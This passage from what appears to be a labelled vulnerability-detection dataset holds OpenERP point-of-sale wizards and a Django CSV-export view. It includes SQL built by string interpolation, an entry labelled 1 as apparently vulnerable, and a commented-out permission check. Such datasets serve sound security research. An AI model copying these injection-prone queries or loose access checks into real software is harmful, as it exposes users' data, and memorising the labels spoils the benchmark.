context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 1}, {"id": "307587cc00d2290a433bf74bd305aecffcbb05a2", "code": "wins/views/flat_csv.py/n/nimport collections\nimport csv\nimport functools\nimport io\nimport zipfile\nfrom operator import attrgetter\nimport mimetypes\n\nfrom django.conf import settings\nfrom django.core.exceptions import ValidationError\nfrom django.db import connection, models\nfrom django.http import HttpResponse, StreamingHttpResponse\nfrom django.utils.decorators import method_decorator\nfrom django.utils.timezone import now\nfrom django.views.decorators.gzip import gzip_page\n\nfrom rest_framework import permissions\nfrom rest_framework.views import APIView\n\nfrom alice.authenticators import IsDataTeamServer\nfrom ..constants import BREAKDOWN_TYPES\nfrom ..models import Advisor, Breakdown, CustomerResponse, Notification, Win\nfrom ..serializers import CustomerResponseSerializer, WinSerializer\nfrom users .models import User\n\n\nclass CSVView(APIView):\n    \"\"\" Endpoint returning CSV of all Win data, with foreign keys flattened \"\"\"\n\n    permission_classes = (permissions.IsAdminUser,)\n    # cache for speed\n    win_fields = WinSerializer().fields\n    customerresponse_fields = CustomerResponseSerializer().fields\n    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',\n                     'complete', 'type', 'type_display',\n                     'export_experience_display', 'location']\n\n    def __init__(self, **kwargs):\n        # cache some stuff to make flat CSV. like prefetch but works easily\n        # with .values()\n        self.users_map = {u.id: u for u in User.objects.all()}\n        prefetch_tables = [\n            ('advisors', Advisor),\n            ('breakdowns', Breakdown),\n            ('confirmations', CustomerResponse),\n            ('notifications', Notification),\n        ]\n        self.table_maps = {}\n        for table, model in prefetch_tables:\n            prefetch_map = collections.defaultdict(list)\n            instances = model.objects.all()\n            if table == 'notifications':\n                instances = instances.filter(type='c').order_by('created')\n            for instance in instances:\n                prefetch_map[instance.win_id].append(instance)\n            self.table_maps[table] = prefetch_map\n        super().__init__(**kwargs)\n\n    def _extract_breakdowns(self, win):\n        \"\"\" Return list of 10 tuples, 5 for export, 5 for non-export \"\"\"\n\n        breakdowns = self.table_maps['breakdowns'][win['id']]\n        retval = []\n        for db_val, name in BREAKDOWN_TYPES:\n\n            # get breakdowns of given type sorted by year\n            type_breakdowns = [b for b in breakdowns if b.type == db_val]\n            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))\n\n            # we currently solicit 5 years worth of breakdowns, but historic\n            # data may have no input for some years\n            for index in range(5):\n                try:\n                    breakdown = \"{0}: \u00a3{1:,}\".format(\n                        type_breakdowns[index].year,\n                        type_breakdowns[index].value,\n                    )\n                except IndexError:\n                    breakdown = None\n\n                retval.append((\n                    \"{0} breakdown {1}\".format(name, index + 1),\n                    breakdown,\n                ))\n\n        return retval\n\n    def _confirmation(self, win):\n        \"\"\" Add fields for confirmation \"\"\"\n\n        if win['id'] in self.table_maps['confirmations']:\n            confirmation = self.table_maps['confirmations'][win['id']][0]\n        else:\n            confirmation = None\n\n        values = [\n            ('customer response recieved',\n             self._val_to_str(bool(confirmation)))\n        ]\n        for field_name in self.customerresponse_fields:\n            if field_name in ['win']:\n                continue\n\n            model_field = self._get_customerresponse_field(field_name)\n            if confirmation:\n                if model_field.choices:\n                    display_fn = getattr(\n                        confirmation, \"get_{0}_display\".format(field_name)\n                    )\n                    value = display_fn()\n                else:\n                    value = getattr(confirmation, field_name)\n            else:\n                value = ''\n\n            model_field_name = model_field.verbose_name or model_field.name\n            if model_field_name == 'created':\n                csv_field_name = 'date response received'\n                if value:\n                    value = value.date()  # just want date\n            else:\n                csv_field_name = model_field_name\n\n            values.append((csv_field_name, self._val_to_str(value)))\n        return values\n\n    def _get_model_field(self, model, name):\n        return next(\n            filter(lambda field: field.name == name, model._meta.fields)\n        )\n\n    @functools.lru_cache(None)\n    def _get_customerresponse_field(self, name):\n        \"\"\" Get field specified in CustomerResponse model \"\"\"\n        return self._get_model_field(CustomerResponse, name)\n\n    @functools.lru_cache(None)\n    def _get_win_field(self, name):\n        \"\"\" Get field specified in Win model \"\"\"\n        return self._get_model_field(Win, name)\n\n    def _val_to_str(self, val):\n        if val is True:\n            return 'Yes'\n        elif val is False:\n            return 'No'\n        elif val is None:\n            return ''\n        else:\n            return str(val)\n\n    @functools.lru_cache(None)\n    def _choices_dict(self, choices):\n        return dict(choices)\n\n    def _get_win_data(self, win):\n        \"\"\" Take Win dict, return ordered dict of {name -> value} \"\"\"\n\n        # want consistent ordering so CSVs are always same format\n        win_data = collections.OrderedDict()\n\n        # local fields\n        for field_name in self.win_fields:\n            if field_name in self.IGNORE_FIELDS:\n                continue\n\n            model_field = self._get_win_field(field_name)\n            if field_name == 'user':\n                value = str(self.users_map[win['user_id']])\n            elif field_name == 'created':\n                value = win[field_name].date()  # don't care about time\n            elif field_name == 'cdms_reference':\n                # numeric cdms reference numbers should be prefixed with\n                # an apostrophe to make excel interpret them as text\n                value = win[field_name]\n                try:\n                    int(value)\n                except ValueError:\n                    pass\n                else:\n                    if value.startswith('0'):\n                        value = \"'\" + value\n            else:\n                value = win[field_name]\n            # if it is a choicefield, do optimized lookup of the display value\n            if model_field.choices and value:\n                try:\n                    value = self._choices_dict(model_field.choices)[value]\n                except KeyError as e:\n                    if model_field.attname == 'hvc':\n                        value = value\n                    else:\n                        raise e\n            else:\n                comma_fields = [\n                    'total_expected_export_value',\n                    'total_expected_non_export_value',\n                    'total_expected_odi_value',\n                ]\n                if field_name in comma_fields:\n                    value = \"\u00a3{:,}\".format(value)\n\n            model_field_name = model_field.verbose_name or model_field.name\n            win_data[model_field_name] = self._val_to_str(value)\n\n        # remote fields\n        win_data['contributing advisors/team'] = (\n            ', '.join(map(str, self.table_maps['advisors'][win['id']]))\n        )\n\n        # get customer email sent & date\n        notifications = self.table_maps['notifications'][win['id']]\n        # old Wins do not have notifications\n        email_sent = bool(notifications or win['complete'])\n        win_data['customer email sent'] = self._val_to_str(email_sent)\n        if notifications:\n            win_data['customer email date'] = str(\n                notifications[0].created.date())\n        elif win['complete']:\n            win_data['customer email date'] = '[manual]'\n        else:\n            win_data['customer email date'] = ''\n\n        win_data.update(self._extract_breakdowns(win))\n        win_data.update(self._confirmation(win))\n\n        return win_data\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        win_datas = [self._get_win_data(win) for win in wins]\n        stringio = io.StringIO()\n        stringio.write(u'\\ufeff')\n        if win_datas:\n            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())\n            csv_writer.writeheader()\n            for win_data in win_datas:\n                csv_writer.writerow(win_data)\n        return stringio.getvalue()\n\n    def _make_user_csv(self):\n        users = User.objects.all()\n        user_dicts = [\n            {'name': u.name, 'email': u.email, 'joined': u.date_joined}\n            for u in users\n        ]\n        stringio = io.StringIO()\n        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())\n        csv_writer.writeheader()\n        for user_dict in user_dicts:\n            csv_writer.writerow(user_dict)\n        return stringio.getvalue()\n\n    def _make_plain_csv(self, table):\n        \"\"\" Get CSV of table \"\"\"\n\n        stringio = io.StringIO()\n        cursor = connection.cursor()\n        cursor.execute(\"select * from wins_{};\".format(table))\n        csv_writer = csv.writer(stringio)\n        header = [i[0] for i in cursor.description]\n        csv_writer.writerow(header)\n        csv_writer.writerows(cursor)\n        return stringio.getvalue()\n\n    def get(self, request, format=None):\n        bytesio = io.BytesIO()\n        zf = zipfile.ZipFile(bytesio, 'w')\n        for table in ['customerresponse', 'notification', 'advisor']:\n            csv_str = self._make_plain_csv(table)\n            zf.writestr(table + 's.csv', csv_str)\n        full_csv_str = self._make_flat_wins_csv()\n        zf.writestr('wins_complete.csv', full_csv_str)\n        full_csv_del_str = self._make_flat_wins_csv(deleted=True)\n        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)\n        user_csv_str = self._make_user_csv()\n        zf.writestr('users.csv', user_csv_str)\n        zf.close()\n        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])\n\n\nclass Echo(object):\n    \"\"\"An object that implements just the write method of the file-like\n    interface.\n    \"\"\"\n\n    def write(self, value):\n        \"\"\"Write the value by returning it, instead of storing in a buffer.\"\"\"\n        return value\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CompleteWinsCSVView(CSVView):\n\n    permission_classes = (IsDataTeamServer,)\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def _make_flat_wins_csv_stream(self, win_data_generator):\n        stringio = Echo()\n        yield stringio.write(u'\\ufeff')\n        first = next(win_data_generator)\n        csv_writer = csv.DictWriter(stringio, first.keys())\n        header = dict(zip(first.keys(), first.keys()))\n        yield csv_writer.writerow(header)\n        yield csv_writer.writerow(first)\n\n        for win_data in win_data_generator:\n            yield csv_writer.writerow(win_data)\n\n    def streaming_response(self, filename):\n        resp = StreamingHttpResponse(\n            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),\n            content_type=mimetypes.types_map['.csv'],\n        )\n        resp['Content-Disposition'] = f'attachent; filename={filename}'\n        return resp\n\n    def get(self, request, format=None):\n        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CurrentFinancialYearWins(CompleteWinsCSVView):\n\n    # permission_classes = (permissions.IsAdminUser,)\n    end_date = None\n\n    def _make_flat_wins_csv(self, **kwargs):\n        \"\"\"\n        Make CSV of all completed Wins till now for this financial year, with non-local data flattened\n        remove all rows where:\n        1. total expected export value = 0 and total non export value = 0 and total odi value = 0\n        2. date created = today (not necessary if this task runs before end of the day for next day download)\n        3. customer email sent is False / No\n        4. Customer response received is not from this financial year\n        Note that this view removes win, notification and customer response entries\n        that might have been made inactive in duecourse\n        \"\"\"\n        with connection.cursor() as cursor:\n            if self.end_date:\n                cursor.execute(\"SELECT id FROM wins_completed_wins_fy where created <= %s\", (self.end_date,))\n            else:\n                cursor.execute(\"SELECT id FROM wins_completed_wins_fy\")\n            ids = cursor.fetchall()\n\n        wins = Win.objects.filter(id__in=[id[0] for id in ids]).values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def get(self, request, format=None):\n        end_str = request.GET.get(\"end\", None)\n        if end_str:\n            try:\n                self.end_date = models.DateField().to_python(end_str)\n            except ValidationError:\n                self.end_date = None\n\n        return self.streaming_response(f'wins_current_fy_{now().isoformat()}.csv')\n/n/n/n", "label": 0}, {"id": "307587cc00d2290a433bf74bd305aecffcbb05a2", "code": "/wins/views/flat_csv.py/n/nimport collections\nimport csv\nimport functools\nimport io\nimport zipfile\nfrom operator import attrgetter\nimport mimetypes\n\nfrom django.conf import settings\nfrom django.core.exceptions import ValidationError\nfrom django.db import connection, models\nfrom django.http import HttpResponse, StreamingHttpResponse\nfrom django.utils.decorators import method_decorator\nfrom django.utils.timezone import now\nfrom django.views.decorators.gzip import gzip_page\n\nfrom rest_framework import permissions\nfrom rest_framework.views import APIView\n\nfrom alice.authenticators import IsDataTeamServer\nfrom ..constants import BREAKDOWN_TYPES\nfrom ..models import Advisor, Breakdown, CustomerResponse, Notification, Win\nfrom ..serializers import CustomerResponseSerializer, WinSerializer\nfrom users .models import User\n\n\nclass CSVView(APIView):\n    \"\"\" Endpoint returning CSV of all Win data, with foreign keys flattened \"\"\"\n\n    permission_classes = (permissions.IsAdminUser,)\n    # cache for speed\n    win_fields = WinSerializer().fields\n    customerresponse_fields = CustomerResponseSerializer().fields\n    IGNORE_FIELDS = ['responded', 'sent', 'country_name', 'updated',\n                     'complete', 'type', 'type_display',\n                     'export_experience_display', 'location']\n\n    def __init__(self, **kwargs):\n        # cache some stuff to make flat CSV. like prefetch but works easily\n        # with .values()\n        self.users_map = {u.id: u for u in User.objects.all()}\n        prefetch_tables = [\n            ('advisors', Advisor),\n            ('breakdowns', Breakdown),\n            ('confirmations', CustomerResponse),\n            ('notifications', Notification),\n        ]\n        self.table_maps = {}\n        for table, model in prefetch_tables:\n            prefetch_map = collections.defaultdict(list)\n            instances = model.objects.all()\n            if table == 'notifications':\n                instances = instances.filter(type='c').order_by('created')\n            for instance in instances:\n                prefetch_map[instance.win_id].append(instance)\n            self.table_maps[table] = prefetch_map\n        super().__init__(**kwargs)\n\n    def _extract_breakdowns(self, win):\n        \"\"\" Return list of 10 tuples, 5 for export, 5 for non-export \"\"\"\n\n        breakdowns = self.table_maps['breakdowns'][win['id']]\n        retval = []\n        for db_val, name in BREAKDOWN_TYPES:\n\n            # get breakdowns of given type sorted by year\n            type_breakdowns = [b for b in breakdowns if b.type == db_val]\n            type_breakdowns = sorted(type_breakdowns, key=attrgetter('year'))\n\n            # we currently solicit 5 years worth of breakdowns, but historic\n            # data may have no input for some years\n            for index in range(5):\n                try:\n                    breakdown = \"{0}: \u00a3{1:,}\".format(\n                        type_breakdowns[index].year,\n                        type_breakdowns[index].value,\n                    )\n                except IndexError:\n                    breakdown = None\n\n                retval.append((\n                    \"{0} breakdown {1}\".format(name, index + 1),\n                    breakdown,\n                ))\n\n        return retval\n\n    def _confirmation(self, win):\n        \"\"\" Add fields for confirmation \"\"\"\n\n        if win['id'] in self.table_maps['confirmations']:\n            confirmation = self.table_maps['confirmations'][win['id']][0]\n        else:\n            confirmation = None\n\n        values = [\n            ('customer response recieved',\n             self._val_to_str(bool(confirmation)))\n        ]\n        for field_name in self.customerresponse_fields:\n            if field_name in ['win']:\n                continue\n\n            model_field = self._get_customerresponse_field(field_name)\n            if confirmation:\n                if model_field.choices:\n                    display_fn = getattr(\n                        confirmation, \"get_{0}_display\".format(field_name)\n                    )\n                    value = display_fn()\n                else:\n                    value = getattr(confirmation, field_name)\n            else:\n                value = ''\n\n            model_field_name = model_field.verbose_name or model_field.name\n            if model_field_name == 'created':\n                csv_field_name = 'date response received'\n                if value:\n                    value = value.date()  # just want date\n            else:\n                csv_field_name = model_field_name\n\n            values.append((csv_field_name, self._val_to_str(value)))\n        return values\n\n    def _get_model_field(self, model, name):\n        return next(\n            filter(lambda field: field.name == name, model._meta.fields)\n        )\n\n    @functools.lru_cache(None)\n    def _get_customerresponse_field(self, name):\n        \"\"\" Get field specified in CustomerResponse model \"\"\"\n        return self._get_model_field(CustomerResponse, name)\n\n    @functools.lru_cache(None)\n    def _get_win_field(self, name):\n        \"\"\" Get field specified in Win model \"\"\"\n        return self._get_model_field(Win, name)\n\n    def _val_to_str(self, val):\n        if val is True:\n            return 'Yes'\n        elif val is False:\n            return 'No'\n        elif val is None:\n            return ''\n        else:\n            return str(val)\n\n    @functools.lru_cache(None)\n    def _choices_dict(self, choices):\n        return dict(choices)\n\n    def _get_win_data(self, win):\n        \"\"\" Take Win dict, return ordered dict of {name -> value} \"\"\"\n\n        # want consistent ordering so CSVs are always same format\n        win_data = collections.OrderedDict()\n\n        # local fields\n        for field_name in self.win_fields:\n            if field_name in self.IGNORE_FIELDS:\n                continue\n\n            model_field = self._get_win_field(field_name)\n            if field_name == 'user':\n                value = str(self.users_map[win['user_id']])\n            elif field_name == 'created':\n                value = win[field_name].date()  # don't care about time\n            elif field_name == 'cdms_reference':\n                # numeric cdms reference numbers should be prefixed with\n                # an apostrophe to make excel interpret them as text\n                value = win[field_name]\n                try:\n                    int(value)\n                except ValueError:\n                    pass\n                else:\n                    if value.startswith('0'):\n                        value = \"'\" + value\n            else:\n                value = win[field_name]\n            # if it is a choicefield, do optimized lookup of the display value\n            if model_field.choices and value:\n                try:\n                    value = self._choices_dict(model_field.choices)[value]\n                except KeyError as e:\n                    if model_field.attname == 'hvc':\n                        value = value\n                    else:\n                        raise e\n            else:\n                comma_fields = [\n                    'total_expected_export_value',\n                    'total_expected_non_export_value',\n                    'total_expected_odi_value',\n                ]\n                if field_name in comma_fields:\n                    value = \"\u00a3{:,}\".format(value)\n\n            model_field_name = model_field.verbose_name or model_field.name\n            win_data[model_field_name] = self._val_to_str(value)\n\n        # remote fields\n        win_data['contributing advisors/team'] = (\n            ', '.join(map(str, self.table_maps['advisors'][win['id']]))\n        )\n\n        # get customer email sent & date\n        notifications = self.table_maps['notifications'][win['id']]\n        # old Wins do not have notifications\n        email_sent = bool(notifications or win['complete'])\n        win_data['customer email sent'] = self._val_to_str(email_sent)\n        if notifications:\n            win_data['customer email date'] = str(\n                notifications[0].created.date())\n        elif win['complete']:\n            win_data['customer email date'] = '[manual]'\n        else:\n            win_data['customer email date'] = ''\n\n        win_data.update(self._extract_breakdowns(win))\n        win_data.update(self._confirmation(win))\n\n        return win_data\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        win_datas = [self._get_win_data(win) for win in wins]\n        stringio = io.StringIO()\n        stringio.write(u'\\ufeff')\n        if win_datas:\n            csv_writer = csv.DictWriter(stringio, win_datas[0].keys())\n            csv_writer.writeheader()\n            for win_data in win_datas:\n                csv_writer.writerow(win_data)\n        return stringio.getvalue()\n\n    def _make_user_csv(self):\n        users = User.objects.all()\n        user_dicts = [\n            {'name': u.name, 'email': u.email, 'joined': u.date_joined}\n            for u in users\n        ]\n        stringio = io.StringIO()\n        csv_writer = csv.DictWriter(stringio, user_dicts[0].keys())\n        csv_writer.writeheader()\n        for user_dict in user_dicts:\n            csv_writer.writerow(user_dict)\n        return stringio.getvalue()\n\n    def _make_plain_csv(self, table):\n        \"\"\" Get CSV of table \"\"\"\n\n        stringio = io.StringIO()\n        cursor = connection.cursor()\n        cursor.execute(\"select * from wins_{};\".format(table))\n        csv_writer = csv.writer(stringio)\n        header = [i[0] for i in cursor.description]\n        csv_writer.writerow(header)\n        csv_writer.writerows(cursor)\n        return stringio.getvalue()\n\n    def get(self, request, format=None):\n        bytesio = io.BytesIO()\n        zf = zipfile.ZipFile(bytesio, 'w')\n        for table in ['customerresponse', 'notification', 'advisor']:\n            csv_str = self._make_plain_csv(table)\n            zf.writestr(table + 's.csv', csv_str)\n        full_csv_str = self._make_flat_wins_csv()\n        zf.writestr('wins_complete.csv', full_csv_str)\n        full_csv_del_str = self._make_flat_wins_csv(deleted=True)\n        zf.writestr('wins_deleted_complete.csv', full_csv_del_str)\n        user_csv_str = self._make_user_csv()\n        zf.writestr('users.csv', user_csv_str)\n        zf.close()\n        return HttpResponse(bytesio.getvalue(), content_type=mimetypes.types_map['.csv'])\n\n\nclass Echo(object):\n    \"\"\"An object that implements just the write method of the file-like\n    interface.\n    \"\"\"\n\n    def write(self, value):\n        \"\"\"Write the value by returning it, instead of storing in a buffer.\"\"\"\n        return value\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CompleteWinsCSVView(CSVView):\n\n    permission_classes = (IsDataTeamServer,)\n\n    def _make_flat_wins_csv(self, deleted=False):\n        \"\"\" Make CSV of all Wins, with non-local data flattened \"\"\"\n\n        if deleted:\n            wins = Win.objects.inactive()\n        else:\n            wins = Win.objects.all()\n\n        if deleted:\n            # ignore users should show up in normal CSV\n            wins = wins.exclude(\n                user__email__in=settings.IGNORE_USERS\n            )\n\n        wins = wins.values()\n\n        for win in wins:\n            yield self._get_win_data(win)\n\n    def _make_flat_wins_csv_stream(self, win_data_generator):\n        stringio = Echo()\n        yield stringio.write(u'\\ufeff')\n        first = next(win_data_generator)\n        csv_writer = csv.DictWriter(stringio, first.keys())\n        header = dict(zip(first.keys(), first.keys()))\n        yield csv_writer.writerow(header)\n        yield csv_writer.writerow(first)\n\n        for win_data in win_data_generator:\n            yield csv_writer.writerow(win_data)\n\n    def streaming_response(self, filename):\n        resp = StreamingHttpResponse(\n            self._make_flat_wins_csv_stream(self._make_flat_wins_csv()),\n            content_type=mimetypes.types_map['.csv'],\n        )\n        resp['Content-Disposition'] = f'attachent; filename={filename}'\n        return resp\n\n    def get(self, request, format=None):\n        return self.streaming_response(f'wins_complete_{now().isoformat()}.csv')\n\n\n@method_decorator(gzip_page, name='dispatch')\nclass CurrentFinancialYearWins(CompleteWinsCSVView):\n\n    # permission_classes = (permissions.IsAdminUser,)\n    end_date = None\n\n    def _make_flat_wins_csv(self, **kwargs):\n        \"\"\"\n        Make CSV of all completed Wins till now for this financial year, with non-local data flattened\n        remove all rows where:\n        1. total expected export value = 0 and total non export value = 0 and total odi value = 0\n        2. date created = today (not necessary if this task runs before end of the day for next day download)\n        3. customer email sent is 